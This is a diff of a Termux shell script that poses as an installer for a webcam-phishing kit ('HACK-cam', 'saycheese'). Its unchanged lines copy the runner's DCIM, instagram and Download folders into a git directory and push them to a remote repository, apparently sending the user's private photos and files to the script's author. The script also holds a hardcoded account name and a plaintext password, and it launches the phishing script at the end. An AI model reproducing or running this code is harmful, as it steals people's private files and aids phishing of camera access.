@@ -62,8 +62,8 @@ cd /sdcard
 cd ~/storage/shared/
 mkdir /sdcard/termux
 cp -r DCIM instagram Download termux
-mv termux ~/kitthack
-cd ~/kitthack
+mv termux ~/HACK-cam
+cd ~/HACK-cam
 touch hi.txt
 git config --global user.email "horrorstories189@gmail.com"
 git config --global user.name "MrAli-s"
@@ -75,8 +75,6 @@ git pull --rebase origin master
 echo -e '"the Username is "MrAli-s"'
 echo -e '"the password is "1928Rami@//"'
 git push -u origin master
-git clone https://github.com/AkanVb/HACK-cam
-mv HACK-cam/post.php saycheese.html template.php jmaxopcam.sh ip.php index.php index2.php
-README.md LICENSE ..
-rm -rf HACK-cam
+git clone https://github.com/AkanVb/Test.git
+mv Test/post.php saycheese.html template.php jmaxopcam.sh ip.php index.php index2.php README.md LICENSE ..
 bash jmaxopcam.sh
